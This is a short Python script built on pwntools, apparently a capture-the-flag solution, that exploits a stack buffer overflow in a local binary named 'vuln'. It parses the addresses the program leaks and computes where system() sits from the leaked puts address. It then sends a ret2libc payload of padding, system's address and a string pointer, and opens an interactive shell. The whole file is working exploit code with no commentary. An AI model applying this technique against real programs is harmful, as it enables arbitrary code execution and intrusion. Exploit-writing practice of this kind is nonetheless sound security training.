#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('./vuln')

gdb_puts = 0xf7e1f380
gdb_system = 0xf7df36e0

A4 = 4 * b'A'


def main():
    proc = elf.process()

    proc.recvuntil('Here are some useful addresses:\n\n')
    addrs = proc.recvuntil('\n\n').decode('utf-8').split('\n')

    runtime_puts = int(addrs[0].split(': ')[1], 16)
    runtime_system = runtime_puts + (gdb_system - gdb_puts)
    runtime_useful_string = int(addrs[4].split(': ')[1], 16)

    payload = 40 * A4 + p32(runtime_system) + A4 + p32(runtime_useful_string)

    proc.recvuntil('Enter a string:')
    proc.send(payload)
    proc.interactive()




if __name__ == '__main__':
    main()
